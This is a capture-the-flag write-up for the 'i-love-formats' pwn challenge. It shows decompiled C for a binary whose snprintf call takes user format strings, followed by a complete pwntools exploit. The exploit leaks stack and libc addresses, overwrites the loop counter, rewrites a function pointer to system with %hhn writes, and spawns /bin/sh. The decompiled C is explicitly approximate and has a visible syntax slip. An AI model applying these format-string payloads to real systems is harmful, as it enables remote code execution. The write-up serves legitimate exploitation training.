# i-love-formats

[library.m0unt41n.ch/challenges/i-love-formats](https://library.m0unt41n.ch/challenges/i-love-formats) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a binary, that runs a dialog where user inputs is passed to `snprintf()` -
with some filtering. We also get some functions that make turning that into a
remote shell easier &#128578;

# Decompilation

Binary has symbols, so that's easy. The code is in [format_extender_re.c](https://github.com/mufl0n/mufl0n.github.io/blob/main/shc/pwn/i-love-formats/format_extender_re.c).
It does compile, but does not run well &#128578; but it is enough to understand the program.

<details>
    <summary>[ Click here to view the source ]</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>

// Called by `%Debug` fmtstring
int (*debug_func)(const char *s) = puts;   // 0x555555558010

// String to be formatted
char user_input[104];                      // 0x555555558060

// Reads up to `len` characters.
// Trims at first EOL, but otherwise allows zeros!
void *read_input(char *buf, int len) {
    if ( !fgets(buf, len, stdin) ) {
        puts("Fail to read input"); exit(-1);
    }
    char *res = strchr(buf, '\n');
    if (res) *res = 0;
}

// Clean string reversal
// (unless the string itself is already overflowing)
void reverse_str(char *str) {
    int q = strlen(str)-1;
    for (int p=0; p<i; p++, q--) {}
        char c = str[p];
        str[p] = str[q];
        str[q] = c;
    }
}

// Clean string uppercase
// (unless the string itself is already overflowing)
void uppercase_str(char *str) {
    int len = strlen(str);
    for (int i=0; i<len; i++)
        str[i] = toupper(str[i]);
}

// Clean string lowercase
// (unless the string itself is already overflowing)
void lowercase_str(char *str) {
    int len = strlen(str);
    for (int i=0; i<len; i++)
        str[i] = tolower(str[i]);
}

// Runs the command, or `man printf` if NULL
// (`man` should fail, it is being removed in the Dockerfile)
int help(char *arg) {
    if (arg)
        return system(arg);
    else
        return system("man printf | head -n 8");
}

// Checks if `fmtstring` contains one of the format specifiers
// This does not prevent %10d or %10$p though and %n is allowed too
int safer_printf(char *fmtstring) {
    char *patterns[15] = {
        "%p", "%x", "%X", "%d", "%i", "%u", "%o", "%f",
        "%F", "%e", "%E", "%g", "%G", "%a", "%l"
    };
    for (int i=0; i<15; i++)
        if (strstr(fmtstring, patterns[i]))
            return 1;
    return 0;
}

void better_printf(char *fmt) {
    char buf[128];

    memset(buf, 0, sizeof(buf));
    if (!strncmp(fmt, "%Rev", 4)) {
        reverse_str(user_input);
        snprintf(buf, 100, "%s", user_input);
    } else if (!strncmp(fmt, "%Upper", 6)) {
        uppercase_str(user_input);
        snprintf(buf, 100, "%s", user_input);
    } else if (!strncmp(fmt, "%Lower", 6)) {
        lowercase_str(user_input);
        snprintf(buf, 100, "%s", user_input);
    } else if (!strncmp(fmt, "%Debug", 6)) {
        debug_func(user_input);
    } else if (!strncmp(fmt, "%Help", 5)) {
        help(NULL);
    } else if (!strncmp(fmt, "%Exit", 5)) {
        exit(0);
    } else if (safer_printf(fmt)) {
        puts("I like string formats, but not number formats!! >:((");
        return;
    } else {
        // *(better_printf+682)
        snprintf(buf, 100, fmt, user_input);
    }
    printf("Result: %s\n\n", buf);
}


int main(int argc, char **argv, char **envp) {
    char fmt[136];

    memset(fmt, 0, 128);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin,  NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    // *(main+184)
    puts("Welcome to my new and improved formatter. Just like printf - just better!\n");
    puts("[DISCLAIMER] This is a DEMO version. You get 3 free tries.");
    for (int i=0; i<=2; i++) {
        memset(fmt, 0, 128);
        printf("Enter format specifier > ");
        read_input(fmt, 128);
        printf("Enter your input > ");
        read_input(user_input, 100);
        better_printf(fmt);
    }
    puts("Thank you for trying my custom formatter  ( ^_^) /");
    return 0;
}
```

</details>

# Running it

There is a `libc-2.39.so` and `ld-2.39.so` attached. There is also a Dockerfile, running the
binary in target `amd64/ubuntu:24.04` environment.

Included README.md hints at [pwninit](https://github.com/io12/pwninit) command
that will make the binary run locally using provided libs:

```bash
pwninit --bin format_extender --libc libs/libc-2.39.so --ld libs/ld-2.39.so
```

Most of my debugging was done with this version, using [pwndbg](https://github.com/pwndbg/pwndbg).

# Analysis

The binary has ASLR, stck canaries, NX, RELRO. Interesting parts:

*   Custom, `fgets`-alike `read_input(buf, len)`. It trims the string at first EOL, but
    it preserves zeros.
*   Fairly clean `reverse_str(s)`, `uppercase_str(s)` and `lowercase_str(s)`, in-place
    string changes, no obvious issues there. Called by `%Rev`, `%Upper` and `%Lower`
    format strings respectively.
*   A `help(arg)` that calls external command - or `man printf` if NULL. It is only called
    from `%Help` fmtstring, with `NULL` as argument, but could be attack vector.
*   `safer_printf(fmtstr)` which supposedly prevents any shady format strings that could be
    used for exploitation.<br>Except that it does not &#128578; Filtering is for `%x`-type patterns,
    whereas the exploits almost always use `%NNNx`.
*   `int (*debug_func)(const char *s) = puts` - this function is called by entering
    `%Debug` as fmt and with the user input as argument.<br>
    *It would be great to have a pointer to `system` here instead* &#128521;
*   `better_printf(fmt)` which parses the format string and calls above functions - or, when
    there is no match, calls:
    
    ```c
    snprintf(buf, 100, fmt, user_input);
    ```
*   Finally, a generic `main()` that gives user three attempts at entering format string and
    the input to be formatted.

The attack vector is quite obvious: with open `snprintf()` we can do arbitrary reads and writes.

>   Note: I previously did not realize that if we combine `%NN$n` arbitrary write hack with
>   long format strings like `%10000s`, `snprintf()` will not overflow the input buffer, **but**
>   it will still **count the characters correctly**. Including when there are multiple `%NN$n` in the
>   format string. This was very useful here.

# First attempt: 3 shots

My first exploit used just the three attempts provided by the program:

1.   Send `0x%4$llx 0x%5$llx ...`-style format string, extract some necessary offsets and
     calculate some others, using deltas found with gdb.
1.   Send, roughly: `%XXXs%36$hn%YYYs%37$hn   NNNNNNNNMMMMMMMM` format string where:
     *   `XXX` are the bits 0-15 of `system`
     *   `YYY` are the bits 16-31 of `system`
     *   `NNNNNNNN` is `p64`'d address of `debug_func` pointer
     *   `MMMMMMMM` is `NNNNNNNN+2`
     *   `36` is the "argument" that falls onto `NNNNNNNN`
     *   `37` is the "argument" that falls onto `MMMMMMMM`
1.   Send `%Debug` format string with `/bin/sh` parameter.

Rationale: only lowest 32-bits of `debug_func` need to be updated, but I could not get a single
`%36$n` to work, so, `hn` was logicla next step.

I **did** get it to work locally (both with pwninit'd binary and the Docker container), but
the exploit did not work remotely - it EOF'd after the step 2.

# Second attempt: unlimited shots

As I did not know exactly what's going on on the remote side, I changed tactics to be more
step-by step. Modified exploit:

1.   (same as above)
1.   Unblock **unlimited attempts**, by writing large negative number to the `i` counter of
     the loop in `main`
1.   Byte-by-byte, put the address of `system` in respective pieces of `debug_func`, using
     `%XXXs%36$hhn     NNNNNNNN` format string.
1.   (same as #3 above)

And that worked &#128578;

# The exploit

## The stack

First, we need to very closely understand the stack layout when the `snprintf()` function
is called. Setting a `break *(better_printf+682)` in pwndbg and running `stack 50 -4` we get:


```bash
04:0020│ rsp 0x7fff98681240 —▸ 0x562b941d4060 (user_input)
05:0028│-098 0x7fff98681248 —▸ 0x7fff98681300 ◂— '0x%51$llx 0x%47$llx 0x%48$llx'
(...)
16:00b0│-010 0x7fff986812d0 —▸ 0x562b941d3d50 (__do_global_dtors_aux_fini_array_entry)
(...)
19:00c8│+008 0x7fff986812e8 —▸ 0x562b941d1ad9 (main+336)
(...)
             0x7fff986812fc ◂— <<< the 32-bit i variable is here >>>
1c:00e0│ rdx 0x7fff98681300 ◂— '0x%51$llx 0x%47$llx 0x%48$llx'
1d:00e8│+028 0x7fff98681308 ◂— 'x 0x%47$llx 0x%48$llx'
1e:00f0│+030 0x7fff98681310 ◂— 'llx 0x%48$llx'
1f:00f8│+038 0x7fff98681318 ◂— '8$llx'
20:0100│+040 0x7fff98681320 ◂— 0
(...)
2f:0178│+0b8 0x7fff98681398 —▸ 0x7fc621c2a1ca (__libc_start_call_main+122)
```

Note that the `-4` part of the `stack` command means that the leftmost hex number is the
**index of `snprintf` parameter** to be used in the format string. Specifically:

| Pos. | Format string | Description                              |
|------|---------------|------------------------------------------|
| 0x04 | `%4$llx`      | `user_input`                             |
| 0x05 | `%5$llx`      | Pointer to the format string below.      |
| 0x16 | `%22$llx`     | `__do_global_dtors_aux_fini_array_entry` |
| 0x19 | `%25$llx`     | `main+336`                               |
| 0x1c | `%28$...`     | Starts the format string                 |
| 0x2f | `%47$llx`     | `__libc_start_call_main+122`             |

Additionally, `%5$llx - 4` will point to the 32-bit `i` loop counter.

## The code

Initialize `pwn`

```python
import pwn
pwn.context(arch='amd64', os='linux', encoding='ascii', log_level='warning')
io = pwn.process('./format_extender_patched')
```

Extract offsets for: `user_input`, `i` and `__libc_start_call_main`

```python
io.recvuntil("Enter format specifier > ")
io.sendline("0x%4$llx 0x%5$llx 0x%47$llx")

io.recvuntil("Enter your input > ")
io.sendline("")

io.recvuntil("Result: ")
s = io.recvline().decode("utf-8").split(" ")

user_input = int(s[0], 16)
i = int(s[1], 16) - 4
libc_start_call_main = int(s[2], 16) - 122
```

Put `128` in the MSB of `i`, giving us unlimited attempts:

```python
io.recvuntil("Enter format specifier > ")
io.sendline("%128s%36$hhn".ljust(64).encode("utf-8")+pwn.p64(i+3))
io.recvuntil("Enter your input > ")
io.sendline("")
```

Calculate address of the `debug_func` variable, using offset from `user_input` extracted above:

>   ```
>   # pwndbg> print &user_input
>   # $8 = (<data variable, no debug info> *) 0x558b92b9d060 <user_input>
>   # pwndbg> print &debug_func
>   # $9 = (<data variable, no debug info> *) 0x558b92b9d010 <debug_func>
>   ```

```python
debug_func = user_input + 0x558b92b9d010 - 0x558b92b9d060
```

Calculate address of `system` function, using offset from `__libc_start_call_main` extracted above:

>   ```
>   # pwndbg> print &system
>   # $12 = (int (*)(const char *)) 0x7fb86fc58740 <__libc_system>
>   # pwndbg> print &__libc_start_call_main
>   # $13 = (void (*)(int (*)(int, char **, char **), int, char **)) 0x7fb86fc2a150 <__libc_start_call_main>
>   ```

```python
system = libc_start_call_main + 0x7fb86fc58740 - 0x7fb86fc2a150
```

Update `debug_func` to point to `system`. 

```python
for idx in range(6):
   io.recvuntil("Enter format specifier > ")
   io.sendline(("%"+str(system&0xFF)+"s%36$hhn").ljust(64).encode("utf-8")+pwn.p64(debug_func+idx))
   io.recvuntil("Enter your input > ")
   io.sendline("")
   system = system>>8
```

Call `%Debug` with `/bin/sh` as argument and enter interactive session

```python
io.recvuntil("Enter format specifier > ")
io.sendline("%Debug")
io.recvuntil("Enter your input > ")
io.sendline("/bin/sh")
io.interactive()
```

This worked &#128578;

```bash
$ ls
flag.txt
format_extender
```

---

## `stairctf{unr3str1ct3d_u5er_f0rm4ts_4r3_d4ng3r0usss_Plz_n3ver_d0_th1s_th4nk_y0U!!!}`



<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
